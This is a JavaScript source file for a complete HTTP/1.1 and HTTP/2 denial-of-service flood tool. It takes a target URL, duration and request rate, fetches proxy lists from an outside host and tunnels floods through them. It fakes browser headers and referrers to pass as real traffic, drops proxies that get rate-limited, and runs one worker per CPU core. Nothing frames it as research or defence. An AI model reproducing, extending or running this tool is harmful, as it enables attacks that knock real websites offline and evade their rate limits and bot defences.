require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const fs = require('node:fs');
const url = require('node:url');
const cluster = require('node:cluster');
const http2 = require('node:http2');
const http = require('node:http');
const os = require('node:os');
const net = require('node:net')

class BrowserHeaderGenerator {
  constructor() {
    this.osVersions = {
      "Windows": [
        "Windows NT 10.0; Win64; x64",
        "Windows NT 11.0; Win64; x64",
        "Windows NT 10.0; WOW64"
      ],
      "macOS": [
        "Macintosh; Intel Mac OS X 10_15_7",
        "Macintosh; Intel Mac OS X 13_6",
        "Macintosh; Apple Silicon Mac OS X 14_5"
      ],
      "Linux": [
        "X11; Linux x86_64",
        "X11; Ubuntu; Linux x86_64",
        "X11; Fedora; Linux x86_64"
      ],
      "Android": [
        "Linux; Android 14; SM-S928B",
        "Linux; Android 14; Pixel 8",
        "Linux; Android 14; OnePlus 12"
      ]
    };

    this.accept_header = [
      'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    ];
    
    this.lang_header = [
      'en-US,en;q=0.9',
      'en-GB,en;q=0.9',
      'en-US,en;q=0.9,fr;q=0.8',
      'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
      'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
      'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
      'zh-CN,zh;q=0.9,en;q=0.8',
      'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', 
      'pt-BR,pt;q=0.9,en;q=0.8'
    ];
    
    this.encoding = [
      "gzip, deflate, br",
      "gzip, deflate, br, zstd",
      "zstd, gzip, deflate, br"
    ];
    
    this.browserVersions = {
      "Chrome": {
        versions: [119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134],
        uaFormat: (version) => `Chrome/${version}.0.0.0`
      },
      "Firefox": {
        versions: [119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136],
        uaFormat: (version) => `Firefox/${version}.0`
      },
      "Edge": {
        versions: [119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134],
        uaFormat: (version) => `Chrome/${version}.0.0.0`
      }
    };
  }

  getRandomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
  }

  getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }

  generateStaticHeaders() {
    const browser = this.getRandomElement(Object.keys(this.browserVersions));
    const browserInfo = this.browserVersions[browser];
    const version = this.getRandomElement(browserInfo.versions);
    const randomOS = this.getRandomElement(Object.keys(this.osVersions));
    const osVersion = this.getRandomElement(this.osVersions[randomOS]);
    let ua = `Mozilla/5.0 (${osVersion})`;
    if (browser === "Chrome" || browser === "Edge") {
      ua += ` AppleWebKit/537.36 (KHTML, like Gecko) ${browserInfo.uaFormat(version)}`;
      if (randomOS === 'Android') ua += ' Mobile';
      ua += ' Safari/537.36';
      if (browser === "Edge") {
        if (randomOS === 'Android') {
          ua += ` ${browserInfo.uaFormat(version).replace('Chrome', 'EdgA')}`
        } else {
          ua += ` ${browserInfo.uaFormat(version).replace('Chrome', 'Edg')}`
        }
      }
    } else if (browser === "Firefox") {
      ua += ` Gecko/20100101 ${browserInfo.uaFormat(version)}`;
    }
    
    const headers = {
      'user-agent': ua,
      'accept': this.getRandomElement(this.accept_header),
      'upgrade-insecure-requests': '1',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'none',
      'sec-fetch-user': '?1'
    };
    
    if (browser === "Chrome" || browser === "Edge") {
      const isBrave = browser === "Chrome" && Math.random() < 0.2;
      let secChUa;
      if (browser === "Chrome") {
        secChUa = `\"Google Chrome\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not-A.Brand\";v=\"99\"`;
        if (isBrave) {
          secChUa = `\"Brave\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not-A.Brand\";v=\"99\"`;
        }
      } else if (browser === "Edge") {
        secChUa = `\"Microsoft Edge\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not-A.Brand\";v=\"99\"`;
      }
      
      headers['sec-ch-ua'] = secChUa;
      headers['sec-ch-ua-mobile'] = (randomOS === 'Android' || randomOS === 'iOS') ? '?1' : '?0';
      headers['sec-ch-ua-platform'] = `\"${randomOS}\"`
      
      if (isBrave) {
        headers['sec-gpc'] = '1';
      }
    }
    return headers;
  }

  generateDynamicHeaders() {
    const headers = {
      'accept-language': this.getRandomElement(this.lang_header),
      'accept-encoding': this.getRandomElement(this.encoding),
      'cache-control': 'max-age=0'
    };

    if (Math.random() < 0.7) {
      const referrers = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://duckduckgo.com/",
        "https://www.facebook.com/",
        "https://twitter.com/",
        "https://www.reddit.com/",
        "https://www.linkedin.com/",
        "https://www.instagram.com/",
      ];
      headers['referer'] = this.getRandomElement(referrers);
      headers['sec-fetch-site'] = 'cross-site';
    }
    return headers;
  }
}

if (process.argv.length < 5) {
    console.log(`Usage: node flood target time req`);
    process.exit();
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
};

var parsedTarget = url.parse(args.target);
let proxies = [];
fetch('https://proxy.bexcode.us.to/')
  .then(res => res.text())
  .then(data => proxies = data.split('\n'))
  .catch(console.error);
let ratelimit = [];
let proxyIndex = 0;
function getNextProxy() {
    let startIndex = proxyIndex;
    do {
        const proxy = proxies[proxyIndex].split(':');
        proxyIndex = (proxyIndex + 1) % proxies.length;
        if (!ratelimit.some(limit => limit.proxy === proxy[0])) {
            return proxy;
        }
    } while (proxyIndex !== startIndex);
    return null;
}
function h2flood() {
    const headerGenerator = new BrowserHeaderGenerator();
    const staticHeaders = headerGenerator.generateStaticHeaders();
    let dynamicHeaders = headerGenerator.generateDynamicHeaders();
    setInterval(() => {
        dynamicHeaders = headerGenerator.generateDynamicHeaders();
    }, 5000);
    ratelimit = ratelimit.filter(limit => Date.now() - limit.timestamp <= limit.time);
    const proxy = getNextProxy();
    if (!proxy) {
      setTimeout(flooders, 5000);
      return;
    }
    const socket = net.connect(Number(proxy[1]), proxy[0], () => {
        socket.once('data', (data) => {
       if (!data.toString("utf-8").includes("HTTP/1.1 200")) {
          socket.destroy()
          return
       }
            socket.setKeepAlive(true);
            socket.setNoDelay(true);
            const client = http2.connect(parsedTarget.href, {
                settings: {
                    headerTableSize: 65536,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 262144,
                    enablePush: false
                },
                socket
            });

            client.on('connect', () => {
                let count = 0;
                const headers = {
                    ":method": "GET",
                    ":path": parsedTarget.path,
                    ":authority": parsedTarget.host,
                    ":scheme": "https"
                };

                const intervalId = setInterval(() => {
                    if (client.destroyed || socket.destroyed) {
                        clearInterval(intervalId);
                        return;
                    }

                    for (let i = 0; i < args.Rate; i++) {
                        const req = client.request({
                            ...headers,
                            ...staticHeaders,
                            ...dynamicHeaders
                        });

                        req.on("response", (res) => {
                            count++;

                            if (res[':status'] === 429) {
                                client.close(http2.constants.NGHTTP2_CANCEL);
                                client.destroy();
                                socket.destroy();

                                ratelimit.push({
                                    proxy: proxy[0],
                                    timestamp: Date.now(),
                                    time: 10000
                                });

                                clearInterval(intervalId);
                                return;
                            }

                            if (res[':status'] === 200 && res["set-cookie"]) {
                                headers["Cookie"] = res['set-cookie'].join('; ');
                            }

                            req.close(http2.constants.NO_ERROR);
                            req.destroy();
                        });

                        if (count >= (args.time * args.Rate) / 3) {
                            client.destroy();
                            socket.destroy();
                            clearInterval(intervalId);
                            return;
                        }

                        req.end();
                    }
                }, 1000);
            });

            client.on('error', (err) => {
                client.destroy();
                socket.destroy();
            });
        });

        socket.on("error", () => {
          socket.destroy();
        });
        if (proxy[2] && proxy[3]) {
            socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\n` + `Host: ${parsedTarget.host}:443\r\n` + `Proxy-Authorization: Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}\r\n` + `Proxy-Connection: Keep-Alive\r\n\r\n`);
        } else {
            socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\n` + `Host: ${parsedTarget.host}:443\r\n` + `Proxy-Connection: Keep-Alive\r\n\r\n`);
        }
    }).once('error', () => { }).once('close', () => {})
}
function h1flood() {
    const headerGenerator = new BrowserHeaderGenerator();
    const staticHeaders = headerGenerator.generateStaticHeaders();
    let dynamicHeaders = headerGenerator.generateDynamicHeaders();
    setInterval(() => {
        dynamicHeaders = headerGenerator.generateDynamicHeaders();
    }, 5000);
    ratelimit = ratelimit.filter(limit => Date.now() - limit.timestamp <= limit.time);
    const proxy = getNextProxy();
    if (!proxy) {
      setTimeout(flooders, 5000);
      return;
    }
    http.request({
        host: proxy[0],
        port: proxy[1],
        agent: new http.Agent({
            keepAlive: true,
            maxFreeSockets: Infinity,
            keepAliveMsecs: Infinity,
            maxSockets: Infinity,
            maxTotalSockets: Infinity
        }),
        method: 'CONNECT',
        path: `${parsedTarget.host}:${parsedTarget.port || (parsedTarget.protocol === 'http:' ? 80 : 443)}`,
        headers: {
            'Host': `${parsedTarget.host}:${parsedTarget.port || (parsedTarget.protocol === 'http:' ? 80 : 443)}`,
            'Proxy-Connection': 'Keep-Alive',
            'Connection': 'Keep-Alive',
            ...(proxy[2] && proxy[3] ? {
                'Proxy-Authorization': 'Basic ' + Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')
            } : {})
        }
    }).on("connect", (res, socket) => {
        socket.setKeepAlive(true);
        socket.setNoDelay(true);
        if (res.statusCode !== 200) return;
        if (parsedTarget.protocol === 'http:') {
            let count = 0;
            const intervalId = setInterval(() => {
                if (socket.destroyed) {
                    clearInterval(intervalId);
                    return;
                }
                for (let i = 0; i < args.Rate; i++) {
                    count++;
                    const headers = {
                        ...staticHeaders,
                        ...dynamicHeaders
                    };
                    let requestHeaders = `GET ${parsedTarget.path} HTTP/1.1\r\n`;
                    requestHeaders += `Host: ${parsedTarget.host}:${parsedTarget.port || 80}\r\n`;

                    for (const [key, value] of Object.entries(headers)) {
                        requestHeaders += `${key}: ${value}\r\n`;
                    }

                    requestHeaders += `Connection: keep-alive\r\n\r\n`;
                    socket.write(requestHeaders);
                    if (count >= args.time * args.Rate / 3) {
                        socket.destroy();
                        clearInterval(intervalId);
                        return;
                    }
                }
            }, 1000);
            socket.on("data", (data) => {
                const match = data.toString().match(/HTTP\/\d\.\d (\d+)/);
                if (match && match[1] == 429) {
                    ratelimit.push({
                        proxy: proxy[0],
                        timestamp: Date.now(),
                        time: 10000
                    });
                    socket.destroy();
                    clearInterval(intervalId);
                }
            });
        }
    }).on("error", () => {
        return;
    }).end();
}
if (cluster.isMaster) {
console.clear();
console.log("\x1b[1;36m|=====================================|\x1b[0m");
console.log("\x1b[1;36mTarget: \x1b[0m\x1b[1;33m" + args.target + "\x1b[0m");
console.log("\x1b[1;36mTime: \x1b[0m\x1b[1;33m" + args.time + "\x1b[0m");
console.log("\x1b[1;36mRate: \x1b[0m\x1b[1;33m" + args.Rate + "\x1b[0m");
console.log("\x1b[1;36m|=====================================|\x1b[0m");
    const restartScript = () => {
        Object.values(cluster.workers).forEach(worker => worker.kill());
        console.log('[>] Restarting script...');
        setTimeout(() => {
            //for (let i = 0; i < args.threads; i++) cluster.fork();
           os.cpus().forEach(() => cluster.fork());
        }, 1000);
    };
    setInterval(() => {
        const ramUsage = ((os.totalmem() - os.freemem()) / os.totalmem()) * 100;
        if (ramUsage >= 90) {
            console.log('[!] Maximum RAM usage:', ramUsage.toFixed(2), '%');
            restartScript();
        }
    }, 1000);
   // for (let i = 0; i < args.threads; i++) cluster.fork();
    os.cpus().forEach(() => cluster.fork());
    setTimeout(() => {
        process.exit();
    }, args.time * 1000);
} else {
if (parsedTarget.protocol === 'http:') {
    setInterval(h1flood);
} else {
    setInterval(h2flood);
}
}
process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
